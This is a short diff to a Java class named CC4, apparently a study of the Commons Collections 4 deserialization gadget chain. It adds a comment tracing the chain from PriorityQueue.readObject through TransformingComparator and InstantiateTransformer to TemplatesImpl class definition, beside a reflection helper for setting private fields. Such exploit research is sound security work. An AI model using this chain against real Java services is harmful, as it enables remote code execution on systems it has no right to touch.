@@ -15,6 +15,21 @@ import java.lang.reflect.Field;
 import java.util.Base64;
 import java.util.PriorityQueue;
 
+/*
+* PriorityQueue.readObject()
+*  ->PriorityQueue.heapify()
+*   ->PriorityQueue.siftDown()
+*    ->PriorityQueue.siftDownUsingComparator()
+*     ->TransformingComparator.compare()
+*      ->ChainedTransformer.transform()
+*       ->InstantiateTransformer.transform()
+*        ->TrAXFilter.TrAXFilter()
+*         ->TemplatesImpl.newTransformer()
+*          ->TemplatesImpl.getTransletInstance()
+*           ->TemplatesImpl.defineTransletClasses()
+*            ->TemplatesImpl$TransletClassLoader.defineClass()
+* */
+
 public class CC4 {
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
         Field field = obj.getClass().getDeclaredField(fieldName);
